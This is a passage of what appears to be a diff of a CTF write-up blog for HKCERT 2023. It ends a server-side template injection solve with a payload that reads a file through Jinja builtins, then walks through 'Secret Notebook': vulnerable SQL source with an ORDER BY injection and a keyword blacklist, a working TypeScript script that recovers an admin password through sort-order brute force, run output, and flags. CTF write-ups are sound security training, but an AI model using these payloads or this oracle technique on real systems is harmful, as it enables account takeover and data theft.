+// {% endraw %}{{get_flashed_messages.__globals__.__builtins__.open("/proof.sh").read()}}{% raw %}
+!include http://puml.local/?puml=%7B%25%20endraw%20%25%7D%7B%7Bget%5Fflashed%5Fmessages%2E%5F%5Fglobals%5F%5F%2E%5F%5Fbuiltins%5F%5F%2Eopen%28%22%2Fproof%2Esh%22%29%2Eread%28%29%7D%7D%7B%25%20raw%20%25%7D
+Alice -> Bob : %load_json("http://puml.local/")
+@enduml
+```
+
+![puml output with flag](https://i.sportshead.dev/1m90bu3.png)
+Flag: `hkcert23{System_Analysis_&_Design_IS_SAD_0r_SAND?}` (make sure to change the `&amp;` to `&`!)
+
+## Secret Notebook - #web
+
+_350 points, 24 solves_
+
+> I wrote a notebook with some juicy secret! Didn't know what's inside then.
+>
+> Web: http://chal-a.hkcert23.pwnable.hk:28107, http://chal-b.hkcert23.pwnable.hk:28107
+>
+> Attachment: [secret-notebook_7b1907aba402ecdb7ac74b14972cf0a0.zip](https://file.hkcert23.pwnable.hk/secret-notebook_7b1907aba402ecdb7ac74b14972cf0a0.zip)
+
+The challenge website presents us with a simple login/signup interface with username/password fields.
+![challenge page](https://i.sportshead.dev/9suivikh.png)
+
+After logging in, we get a page with a text box, and three buttons to submit notes, retrieve secret notes, and retrieve public notes. Clicking `retrieve public notes` renders a table to the page of usernames and public notes:
+![challenge page with table](https://i.sportshead.dev/wonqi8d.png)
+
+Clicking `retrieve secret notes` does nothing - we will probably need to be logged in as Administrator. Taking a look at the [source code](https://gist.github.com/sportshead/f912d92a28e33938e45b02005d67b23c), we can see all the SQL queries are using parameterised queries, and therefore not vulnerable to SQL injection - apart from the `doGetPublicNotes` function:
+
+```python=
+def doGetPublicNotes(column, ascending):
+    connector = getConnector()
+    cursor = connector.cursor()
+    if column and not isInputValid(column):
+        abort(403)
+    if ascending  != "ASC":
+        ascending = "DESC"
+    cursor.execute(f"SELECT username, publicnote FROM users ORDER BY {column} {ascending};")
+    results = []
+    for row in cursor.fetchall():
+        results.append({'username':row[0],
+        'publicnote':row[1]})
+    cursor.close()
+    connector.close()
+    return results
+```
+
+Unfortunately, `ascending` can either be `ASC` or `DESC`, and `column` is checked against `isInputValid`:
+
+```python=
+def isInputValid(untrustedInput: str) -> bool:
+    if "'" in untrustedInput \
+        or "\"" in untrustedInput \
+        or ";"  in untrustedInput \
+        or "/"  in untrustedInput \
+        or "*"  in untrustedInput \
+        or "-"  in untrustedInput \
+        or "#"  in untrustedInput \
+        or "select"  in untrustedInput.lower() \
+        or "insert"  in untrustedInput.lower() \
+        or "update"  in untrustedInput.lower() \
+        or "delete"  in untrustedInput.lower() \
+        or "where"  in untrustedInput.lower() \
+        or "union"  in untrustedInput.lower() \
+        or "sleep"  in untrustedInput.lower() \
+        or "secretnote"  in untrustedInput.lower() :
+        return False
+    return True
+```
+
+The blacklist is pretty strict on what we can pass in, but we can still sort by arbitrary columns (except for `secretnote`).
+
+```sql=
+CREATE TABLE IF NOT EXISTS users (
+  username VARCHAR(16) NOT NULL,
+  password VARCHAR(32) NOT NULL,
+  publicnote VARCHAR(64),
+  secretnote VARCHAR(64),
+  PRIMARY KEY (username)
+);
+```
+
+```python=
+def init():
+    connector = getConnector()
+    cursor = connector.cursor()
+    digits = string.digits
+    password = ''.join(secrets.choice(digits) for i in range(16))
+    cursor.execute(f"INSERT INTO users (username, password, publicnote, secretnote) VALUES ('{'Administrator'}','{password}','{'Welcome! I am admin and I hope you are having fun.'}', '{os.environ['FLAG']}') ON DUPLICATE KEY UPDATE password = '{password}';")
+    connector.commit()
+    cursor.close()
+    connector.close()
+```
+
+We can see that the `Administrator` acccount is initialised with the flag, and a random 16 digit string is generated for the password. The signup route is not protected by any captcha, so we can easily bruteforce the `Administrator` password using binary search and sorting by columns.
+
+```typescript=
+const HOST = "http://chal-b.hkcert23.pwnable.hk:28107";
+
+const signup = (username: string, password: string) => fetch(`${HOST}/signup`, {
+    body: JSON.stringify({username, password}),
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    }
+}).then(res => res.ok);
+
+interface UserData {
+    username: string;
+    publicnote: string;
+}
+
+const cookie = btoa(`root:s2rYMCv3g2Gk`); // apparently this is actually not meant as a user/pass for the chall
+// its actually the sql DB info
+const getPasswords = (): Promise<{
+    content: UserData[]
+}> => fetch(`${HOST}/note?noteType=public&column=password&ascending=ASC`, {
+    headers: {
+        "Cookie": `token=${cookie}`
+    }
+}).then(res => res.json());
+
+const PREFIX = "ez";
+let iter = 0;
+const newUsername = () => `${PREFIX}${iter++}`;
+
+let min = 0;
+let max = 10;
+let correct = "";
+
+while (true) {
+    if (max - min < 2) {
+        correct += min.toString();
+        console.log("got correct digit:", min, "new:", correct);
+        min = 0;
+        max = 10;
+        if (correct.length === 16) {
+            throw "done";
+        }
+    }
+    const guess = Math.floor((min + max) / 2);
+    const guessStr = (correct + guess.toString()).padEnd(16, "0");
+
+    const username = newUsername();
+    await signup(username, guessStr);
+
+    const {content: passwords} = await getPasswords();
+
+    const adminIndex = passwords.findIndex(u => u.username === "Administrator");
+    const guessIndex = passwords.findIndex(u => u.username === username);
+
+    console.log(username, min, max, guessStr, adminIndex, guessIndex);
+
+    if (adminIndex > guessIndex) { // admin is greater
+        min = guess;
+    } else if (adminIndex < guessIndex) { // admin is smaller
+        max = guess;
+    } else {
+        // wtf???
+        throw "admin == guess???";
+    }
+}
+```
+
+```typescript
+user@computer:~/projects/ctf/hkcert/2023/notebook/pwn$ bun run pwn.ts
+ez88 0 10 5000000000000000 82 237
+ez89 0 5 2000000000000000 82 207
+ez90 0 2 1000000000000000 82 177
+got correct digit: 0 new: 0
+...
+got correct digit: 8 new: 033634733381008
+ez142 0 10 0336347333810085 107 112
+ez143 0 5 0336347333810082 107 109
+ez144 0 2 0336347333810081 108 107
+got correct digit: 1 new: 0336347333810081
+error: done
+```
+
+All that work with the script, and turns out someone gave the password away with their attempt (only backwards), and my script was one digit off:
+![secretnotebook-01](https://i.sportshead.dev/an49k09.png)
+Password: `0336347333810082`
+Flag: `hkcert23{17_15_n07_50_53cr37_4f73r_4ll}`
+
+## Conclusion
+
+All in all, the HKCERT23 CTF was quite fun and I think the challenges were written quite well. In the future I hope to be able to see some more complex web problems, and also maybe some more node.js problems.
